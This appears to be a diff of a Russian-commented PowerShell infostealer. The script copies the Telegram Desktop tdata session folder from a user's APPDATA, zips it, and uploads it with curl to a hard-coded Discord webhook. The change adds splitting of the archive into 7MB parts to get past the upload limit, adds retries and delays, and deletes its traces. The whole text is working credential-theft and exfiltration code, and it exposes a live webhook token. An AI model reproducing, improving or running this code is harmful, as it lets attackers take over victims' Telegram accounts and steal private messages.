@@ -1,5 +1,5 @@
-# ===== СКРИПТ ALPHA ДЛЯ ZETA v4.0 - ВСЯ TDATA В ОДНОМ АРХИВЕ =====
-# Копируем всё в одну папку, потом зипуем целиком
+# ===== СКРИПТ ALPHA ДЛЯ ZETA v5.0 - РАЗБИВКА АРХИВА =====
+# Discord Webhook лимит - 8MB, поэтому режем на части по 7MB
 
 $webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"
 
@@ -44,39 +44,76 @@ function New-ZipArchive {
 }
 
 # ============================================================
+# ФУНКЦИЯ РАЗБИВКИ ФАЙЛА НА ЧАСТИ
+# ============================================================
+function Split-File {
+    param(
+        [string]$FilePath,
+        [int]$PartSizeMB = 7
+    )
+    
+    if (-not (Test-Path $FilePath)) { return @() }
+    
+    $fileSize = (Get-Item $FilePath).Length
+    $partSize = $PartSizeMB * 1MB
+    $parts = [math]::Ceiling($fileSize / $partSize)
+    
+    Write-Host "[*] Разбиваю файл на $parts частей по $PartSizeMB MB..." -ForegroundColor Yellow
+    
+    $partFiles = @()
+    $stream = [System.IO.File]::OpenRead($FilePath)
+    $buffer = New-Object byte[] $partSize
+    
+    for ($i = 1; $i -le $parts; $i++) {
+        $read = $stream.Read($buffer, 0, $buffer.Length)
+        if ($read -eq 0) { break }
+        
+        $partFile = "$FilePath.part$i"
+        [System.IO.File]::WriteAllBytes($partFile, $buffer[0..($read-1)])
+        $partFiles += $partFile
+        Write-Host "[✓] Часть $i/$parts создана: $([math]::Round((Get-Item $partFile).Length/1MB,2)) MB" -ForegroundColor Green
+    }
+    
+    $stream.Close()
+    return $partFiles
+}
+
+# ============================================================
 # ФУНКЦИЯ ОТПРАВКИ ФАЙЛА В DISCORD
 # ============================================================
 function Send-File {
     param($FilePath)
-    if (-not (Test-Path $FilePath)) { return }
+    if (-not (Test-Path $FilePath)) { return $false }
+    
     $size = (Get-Item $FilePath).Length / 1MB
-    if ($size -gt 25) {
-        Write-Host "[!] Файл весит $([math]::Round($size,2)) MB (>25MB), разбиваю..." -ForegroundColor Yellow
-        # Разбиваем на части по 20MB
-        $baseName = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
-        $ext = [System.IO.Path]::GetExtension($FilePath)
-        $dir = Split-Path $FilePath -Parent
-        
-        $part = 1
-        $stream = [System.IO.File]::OpenRead($FilePath)
-        $buffer = New-Object byte[] (20MB)
-        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
-            $partFile = Join-Path $dir "$baseName.part$part$ext"
-            [System.IO.File]::WriteAllBytes($partFile, $buffer[0..($read-1)])
-            curl.exe -s -F "file=@$partFile" $webhook
-            Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($partFile))" -ForegroundColor Green
-            Remove-Item $partFile -Force
-            $part++
+    
+    if ($size -gt 7) {
+        Write-Host "[!] Файл весит $([math]::Round($size,2)) MB (>7MB), разбиваю..." -ForegroundColor Yellow
+        $parts = Split-File -FilePath $FilePath -PartSizeMB 7
+        foreach ($part in $parts) {
+            $result = Send-File -FilePath $part
+            Remove-Item $part -Force -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 1
         }
-        $stream.Close()
-        return
+        return $true
     }
-    curl.exe -s -F "file=@$FilePath" $webhook
-    Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($FilePath))" -ForegroundColor Green
+    
+    try {
+        $result = curl.exe -s -F "file=@$FilePath" $webhook
+        if ($result -match "40005") {
+            Write-Host "[!] Ошибка: файл слишком большой для Discord" -ForegroundColor Red
+            return $false
+        }
+        Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($FilePath)) ($([math]::Round($size,2)) MB)" -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "[!] Ошибка отправки: $_" -ForegroundColor Red
+        return $false
+    }
 }
 
 # ============================================================
-# БЛОК: TELEGRAM TDATA - КОПИРУЕМ ВСЁ В ОДНУ ПАПКУ
+# БЛОК: TELEGRAM TDATA
 # ============================================================
 $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
 if (Test-Path $tgPath) {
@@ -88,9 +125,9 @@ if (Test-Path $tgPath) {
     if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force }
     New-Item -Path $tgRoot -ItemType Directory -Force | Out-Null
 
-    # ---- КОПИРУЕМ ВСЁ В ОДНУ ПАПКУ ----
+    # ---- КОПИРУЕМ ВСЁ ----
     
-    # 1. Папка D877F783D5D3EF8C - копируем с сохранением структуры
+    # 1. D877F783D5D3EF8C
     $d1 = Join-Path $tgPath "D877F783D5D3EF8C"
     if (Test-Path $d1) {
         $dest = Join-Path $tgRoot "D877F783D5D3EF8C"
@@ -99,7 +136,7 @@ if (Test-Path $tgPath) {
         Write-Host "[✓] D877F783D5D3EF8C: $cnt файлов" -ForegroundColor Green
     }
 
-    # 2. user_data/cache/номер/ - копируем с переименованием
+    # 2. user_data/cache/номер/
     $cacheRoot = Join-Path $tgPath "user_data\cache"
     if (Test-Path $cacheRoot) {
         $numDirs = Get-ChildItem -Path $cacheRoot -Directory
@@ -119,7 +156,7 @@ if (Test-Path $tgPath) {
         }
     }
 
-    # 3. user_data/media_cache/номер/ - копируем с переименованием
+    # 3. user_data/media_cache/номер/
     $mediaRoot = Join-Path $tgPath "user_data\media_cache"
     if (Test-Path $mediaRoot) {
         $numDirs = Get-ChildItem -Path $mediaRoot -Directory
@@ -139,7 +176,7 @@ if (Test-Path $tgPath) {
         }
     }
 
-    # 4. Корневые файлы tdata - копируем в корень tgRoot
+    # 4. Корневые файлы
     $rootFiles = Get-ChildItem -Path $tgPath -File
     if ($rootFiles.Count -gt 0) {
         $counter = 1
@@ -152,8 +189,8 @@ if (Test-Path $tgPath) {
         Write-Host "[✓] tdata root: $($rootFiles.Count) файлов" -ForegroundColor Green
     }
 
-    # ---- СОЗДАЁМ ОДИН БОЛЬШОЙ АРХИВ ----
-    Write-Host "[*] Создаю один архив для всей tdata..." -ForegroundColor Cyan
+    # ---- СОЗДАЁМ АРХИВ ----
+    Write-Host "[*] Создаю архив..." -ForegroundColor Cyan
     
     $totalSize = (Get-ChildItem -Path $tgRoot -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1MB
     Write-Host "[*] Общий размер: $([math]::Round($totalSize,2)) MB" -ForegroundColor Yellow
@@ -165,19 +202,18 @@ if (Test-Path $tgPath) {
         $zipSize = (Get-Item $zipPath).Length / 1MB
         Write-Host "[✓] Архив создан, размер: $([math]::Round($zipSize,2)) MB" -ForegroundColor Green
         
-        # Отправляем архив
+        # Отправляем архив с автоматической разбивкой
         Send-File -FilePath $zipPath
         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
     } else {
         Write-Host "[!] Не удалось создать архив, отправляю файлами..." -ForegroundColor Red
-        # Если архив не создался - отправляем всё по отдельности
         $allFiles = Get-ChildItem -Path $tgRoot -Recurse -File
         foreach ($f in $allFiles) {
             Send-File -FilePath $f.FullName
+            Start-Sleep -Milliseconds 500
         }
     }
 
-    # Уборка
     Remove-Item $tgRoot -Recurse -Force
     Write-Host "[✓] Telegram готов, Alpha!" -ForegroundColor Green
 }
@@ -186,4 +222,4 @@ if (Test-Path $tgPath) {
 # ФИНАЛ
 # ============================================================
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-Write-Host "[✓] Миссия выполнена, Alpha! Вся tdata в одном архиве, сука!" -ForegroundColor Magenta
+Write-Host "[✓] Всё сделано, Alpha! Архив разбит на части по 7MB и отправлен." -ForegroundColor Magenta
